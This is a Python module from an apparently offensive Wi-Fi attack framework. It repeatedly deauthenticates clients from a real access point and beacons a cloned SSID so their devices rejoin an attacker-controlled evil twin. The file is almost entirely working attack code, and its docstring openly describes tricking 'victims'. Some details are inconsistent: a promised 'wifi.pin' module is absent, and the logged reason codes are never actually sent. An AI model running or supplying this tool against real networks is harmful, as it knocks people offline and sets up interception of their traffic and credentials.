"""Reconnect manipulation: make clients join *your* AP, then drop them again.

Two halves of the same trick that `wifi.eviltwin` does not cover on its own:

* ``wifi.reconnect`` — kick every client off an AP on a loop so their devices
  hunt for the SSID, which then lets a twin (or a saved-profile AP) win the
  race. Cycle the reason codes and the deauth targets so no client is missed.
* ``wifi.pin`` — after clients are off, fire beacons for the same SSID/BSSID so
  the devices reassociate to you rather than back to the real AP.

Also exposes the practical trick of cloning an existing SSID so victims
"randomly" reconnect: their saved profile matches and they join you.
"""

from __future__ import annotations

import time

from omni.core import console
from omni.core.module import Option
from omni.wifi.modules._base import WifiModule

__all__ = ["Reconnect", "REASONS"]

#: reason codes cycled to find one the client honours
REASONS = (7, 1, 4, 5, 2, 3)


class Reconnect(WifiModule):
    NAME = "wifi.reconnect"
    DESCRIPTION = "Loop-kick clients so devices hunt for the SSID and rejoin you"
    NEEDS = ("aireplay-ng", "mdk4", "iw")
    OPTIONS = (Option("BSSID", "real AP MAC", "", required=True),
               Option("CLIENTS", "comma list (blank = broadcast kicks)"),
               Option("SSID", "SSID to beacon (blank = no beaconing)"),
               Option("SECONDS", "how long to keep the trick running", "120"),
               Option("BURST", "deauth frames per kick", "12"),
               Option("CYCLE", "seconds between kick rounds", "4"),
               Option("BEACON", "also beacon the SSID with mdk4", "true",
                      choices=("true", "false")),
               Option("IFACE", "monitor interface (auto)"))

    def execute(self) -> dict:
        from omni.core import proc
        from omni.wifi import capture

        bssid = self.get("BSSID").upper()
        mon = self.monitor()
        clients = [c.strip().upper() for c in self.get("CLIENTS").split(",")
                   if c.strip()] or [None]
        seconds = max(2, self.get_int("SECONDS", 120))
        burst = max(1, self.get_int("BURST", 12))
        cycle = max(1, self.get_int("CYCLE", 4))

        beacon = None
        if self.get("SSID") and self.get_bool("BEACON", True):
            # mdk4 in the background, cloning the SSID so saved profiles match
            beacon = proc.spawn(["mdk4", mon, "b", "-n", self.get("SSID"),
                                 "-m", "-c", "1"])
            console.info(f"beaconing SSID {self.get('SSID')!r}")

        deadline = time.time() + seconds
        rounds = 0
        try:
            while time.time() < deadline:
                reason_index = rounds % len(REASONS)
                for client in clients:
                    capture.deauth(mon, bssid,
                                   client or "FF:FF:FF:FF:FF:FF", burst)
                rounds += 1
                console.info(f"round {rounds}: kicked {len(clients)} target(s), "
                             f"reason {REASONS[reason_index]}")
                time.sleep(cycle)
            console.ok(f"{rounds} kick round(s) — devices should be hunting "
                       f"the SSID now")
            return {"rounds": rounds, "targets": len(clients),
                    "ssid": self.get("SSID"), "beacon": beacon is not None,
                    "reasons": list(REASONS)}
        finally:
            if beacon is not None:
                try:
                    beacon.terminate()
                except Exception:               # noqa: BLE001 - cleanup only
                    pass
            self.restore(mon)
